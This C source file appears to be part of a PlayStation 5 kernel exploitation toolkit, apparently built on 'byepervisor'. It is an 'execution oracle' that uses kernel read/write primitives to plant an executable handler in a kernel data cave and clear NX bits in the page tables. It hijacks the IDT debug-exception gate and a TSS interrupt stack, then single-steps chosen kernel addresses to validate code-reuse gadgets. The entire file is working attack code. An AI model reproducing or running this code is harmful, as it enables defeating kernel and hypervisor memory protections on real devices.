/*
 * ot_oracle.c -- outer installer for the gadget-free execution oracle.
 *
 * Breaks the table dependency: a native, hand-authored #DB handler is reached in
 * kernel context with no kernel gadgets at all. The IDT[1] gate is pointed
 * straight at our blob (in the data cave, made executable), TSS IST6 is aimed at
 * a private cave stack, and a user-mode single-step (TF) drives one #DB onto our
 * handler.
 *
 *  Stage A (record): the handler records the interrupt frame + GPRs; we read
 *      them back and restore the gate. Proves gate + native handler + IST path.
 *
 *  Stage B (step): the handler stashes the user context, loads a fully
 *      controlled register/stack/RIP state and jumps to a candidate `ktext`
 *      address with TF set. The candidate executes exactly one instruction; the
 *      resulting #DB captures the post-state, after which the user context is
 *      restored. This validates a gadget/instruction without ever reading text.
 *
 * No kernel .text bytes are read and no gadgets are used.
 *
 * SPDX-License-Identifier: AGPL-3.0-only
 */
#include "ot_oracle.h"

#include "ot_oracle_layout.h"
#include "ot_oracle_blob.h"

#include "byepervisor/kdlsym.h"
#include "byepervisor/khook.h"
#include "byepervisor/paging.h"
#include "utils.h"

#include <ps5/kernel.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define OT_IST_INDEX 6
#define OT_HOOK_CORE 0
#define OT_TSS_STRIDE 0x68
#define OT_SEED_QWORDS 8

static uint64_t g_scratch;
static uint64_t g_blob_va;
static uint64_t g_stack_top;
static uint64_t g_idt;
static uint64_t g_tss;
static uint64_t g_ist_slot;
static uint64_t g_db_gate;
static uint64_t g_saved_ist, g_saved_gate_lo, g_saved_gate_hi;

static void gate_encode(uint64_t off, uint16_t sel, uint8_t ist, uint8_t type,
                        uint8_t dpl, int present, uint64_t *lo, uint64_t *hi) {
  *lo = (off & 0xFFFF) | ((uint64_t)sel << 16) | ((uint64_t)(ist & 7) << 32) |
        ((uint64_t)(type & 0xF) << 40) | ((uint64_t)(dpl & 3) << 45) |
        ((uint64_t)(present ? 1 : 0) << 47) | (((off >> 16) & 0xFFFF) << 48);
  *hi = (off >> 32) & 0xFFFFFFFFULL;
}

static int probe_write(uint64_t addr, uint64_t probe) {
  uint64_t save = kread64(addr);
  kwrite64(addr, probe);
  uint64_t rb = kread64(addr);
  kwrite64(addr, save);
  return rb == probe;
}

/* Clear NX at every populated level for `va` in `pmap` (kernel context). */
static void make_exec(uint64_t pmap, uint64_t va) {
  uint64_t a, e;

  a = find_pml4e(pmap, va, &e);
  if (a != 0xFFFFFFFFFFFFFFFFull) {
    CLEAR_PDE_BIT(e, EXECUTE_DISABLE);
    kwrite64(a, e);
  }
  a = find_pdpe(pmap, va, &e);
  if (a != 0xFFFFFFFFFFFFFFFFull) {
    CLEAR_PDE_BIT(e, EXECUTE_DISABLE);
    kwrite64(a, e);
  }
  a = find_pde(pmap, va, &e);
  if (a != 0xFFFFFFFFFFFFFFFFull) {
    CLEAR_PDE_BIT(e, EXECUTE_DISABLE);
    kwrite64(a, e);
    if (PDE_FIELD(e, PS) != 1) {
      a = find_pte(pmap, va, &e);
      if (a != 0xFFFFFFFFFFFFFFFFull) {
        CLEAR_PDE_BIT(e, EXECUTE_DISABLE);
        kwrite64(a, e);
      }
    }
  }
}

/* Set TF and execute one user instruction so the CPU raises #DB onto our gate. */
static void ot_trigger(void) {
  __asm__ volatile("pushfq\n\t"
                   "orq $0x100, (%%rsp)\n\t"
                   "popfq\n\t"
                   "nop\n\t" ::: "memory", "cc");
}

/* One oracle run. candidate==0 -> record mode. Otherwise stage the control
 * block and single-step `candidate` with the supplied register seeds. */
static int oracle_exec(uint64_t candidate, const struct ot_oracle_gregs *seed,
                       struct ot_oracle_result *out) {
  uint64_t kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);

  if (!g_scratch || !g_idt || !g_tss || !kernel_pmap) {
    printf("[oracle] missing anchors (cave/idt/tss/pmap)\n");
    return -1;
  }

  if (!probe_write(g_blob_va, 0xA5A5A5A5A5A5A5A5ULL)) {
    printf("[oracle] data cave not writable at %#lx\n", (unsigned long)g_blob_va);
    return -1;
  }

  kwrite(g_blob_va, ot_oracle_blob_bin, ot_oracle_blob_bin_len);
  {
    struct ot_oracle_result zero;
    for (unsigned i = 0; i < sizeof zero; i++)
      ((uint8_t *)&zero)[i] = 0;
    kwrite(g_blob_va + OT_ORACLE_RESULT_OFF, &zero, sizeof zero);
  }

  if (candidate) {
    struct ot_oracle_ctl ctl;
    for (unsigned i = 0; i < sizeof ctl; i++)
      ((uint8_t *)&ctl)[i] = 0;
    ctl.mode = OT_MODE_STEP;
    ctl.candidate = candidate;
    ctl.ctl_rsp = g_stack_top;
    if (seed)
      ctl.gregs = *seed;
    kwrite(g_blob_va + OT_ORACLE_PARAM_OFF, &ctl, sizeof ctl);

    /* Pre-fill the controlled stack so pop-style gadgets read known values. */
    for (uint64_t i = 0; i < OT_SEED_QWORDS; i++) {
      uint64_t seedv = 0xB000000000000000ULL | (i * 0x1111111111111111ULL);
      kwrite64(g_stack_top + i * 8, seedv);
    }
  } else {
    struct ot_oracle_ctl ctl;
    for (unsigned i = 0; i < sizeof ctl; i++)
      ((uint8_t *)&ctl)[i] = 0;
    ctl.mode = OT_MODE_RECORD;
    kwrite(g_blob_va + OT_ORACLE_PARAM_OFF, &ctl, sizeof ctl);
  }

  make_exec(kernel_pmap, g_blob_va);

  /* Save and rig the gate + IST. */
  g_saved_gate_lo = kread64(g_db_gate);
  g_saved_gate_hi = kread64(g_db_gate + 8);
  g_saved_ist = kread64(g_ist_slot);

  uint16_t kcs = (uint16_t)(g_saved_gate_lo >> 16);
  if (!kcs) {
    printf("[oracle] IDT[1] has no CS; refusing\n");
    return -1;
  }
  {
    uint64_t lo, hi;
    gate_encode(g_blob_va, kcs, OT_IST_INDEX, 0xE, 0, 1, &lo, &hi);
    kwrite64(g_db_gate + 8, hi);
    kwrite64(g_db_gate, lo);
  }
  kwrite64(g_ist_slot, g_stack_top);

  pin_to_core(OT_HOOK_CORE);
  ot_trigger();

  /* Restore before reading results, so a stray #DB anywhere is not caught. */
  kwrite64(g_db_gate + 8, g_saved_gate_hi);
  kwrite64(g_db_gate, g_saved_gate_lo);
  kwrite64(g_ist_slot, g_saved_ist);

  kread(g_blob_va + OT_ORACLE_RESULT_OFF, out, sizeof *out);
  return 0;
}

int ot_oracle_selftest(void) {
  g_scratch = kdlsym(KERNEL_SYM_DATA_CAVE);
  g_idt = kdlsym(KERNEL_SYM_IDT_ARRAY);
  g_tss = kdlsym(KERNEL_SYM_COMMON_TSS);
  g_blob_va = g_scratch + OT_ORACLE_BLOB_OFF;
  g_stack_top = g_scratch + OT_ORACLE_STACK_OFF;
  g_ist_slot = g_tss + (uint64_t)OT_HOOK_CORE * OT_TSS_STRIDE + KH_TSS_IST(OT_IST_INDEX);
  g_db_gate = g_idt + 16 * KH_VEC_DB;

  printf("[oracle] cave=%#lx blob=%#lx stack=%#lx idt=%#lx tss=%#lx\n",
         (unsigned long)g_scratch, (unsigned long)g_blob_va,
         (unsigned long)g_stack_top, (unsigned long)g_idt,
         (unsigned long)g_tss);

  struct ot_oracle_result r;
  if (oracle_exec(0, NULL, &r) != 0)
    return -1;

  printf("[oracle] core=%d result magic=%#lx entries=%lu dr6=%#lx\n",
         sceKernelGetCurrentCpu(), (unsigned long)r.magic,
         (unsigned long)r.entries, (unsigned long)r.dr6);
  if (r.magic != OT_ORACLE_RESULT_MAGIC) {
    printf("[oracle] handler did NOT run (no magic)\n");
    return -1;
  }

  printf("[oracle] frame rip=%#lx cs=%#lx rflags=%#lx rsp=%#lx ss=%#lx\n",
         (unsigned long)r.frame_rip, (unsigned long)r.frame_cs,
         (unsigned long)r.frame_rflags, (unsigned long)r.frame_rsp,
         (unsigned long)r.frame_ss);
  printf("[oracle] gregs rax=%#lx rbx=%#lx rcx=%#lx rdx=%#lx\n",
         (unsigned long)r.gregs.rax, (unsigned long)r.gregs.rbx,
         (unsigned long)r.gregs.rcx, (unsigned long)r.gregs.rdx);

  return 0;
}

int ot_oracle_step(uint64_t addr) {
  if (!addr) {
    printf("[oracle] no candidate address\n");
    return -1;
  }

  struct ot_oracle_gregs seed;
  for (unsigned i = 0; i < sizeof seed; i++)
    ((uint8_t *)&seed)[i] = 0;

  printf("[oracle] step candidate=%#lx\n", (unsigned long)addr);

  struct ot_oracle_result r;
  if (oracle_exec(addr, &seed, &r) != 0)
    return -1;

  printf("[oracle] step result entries=%lu magic=%#lx\n",
         (unsigned long)r.entries, (unsigned long)r.magic);
  if (r.magic != OT_ORACLE_RESULT_MAGIC || r.entries < 2) {
    printf("[oracle] step did NOT complete (entries=%lu)\n",
           (unsigned long)r.entries);
    return -1;
  }

  printf("[oracle] candidate=%#lx -> rip=%#lx rsp=%#lx rflags=%#lx\n",
         (unsigned long)addr, (unsigned long)r.frame_rip,
         (unsigned long)r.frame_rsp, (unsigned long)r.frame_rflags);
  printf("[oracle] post rax=%#lx rcx=%#lx rdx=%#lx rbx=%#lx\n",
         (unsigned long)r.gregs.rax, (unsigned long)r.gregs.rcx,
         (unsigned long)r.gregs.rdx, (unsigned long)r.gregs.rbx);
  printf("[oracle] advance=%ld bytes\n",
         (long)((int64_t)r.frame_rip - (int64_t)addr));

  return 0;
}
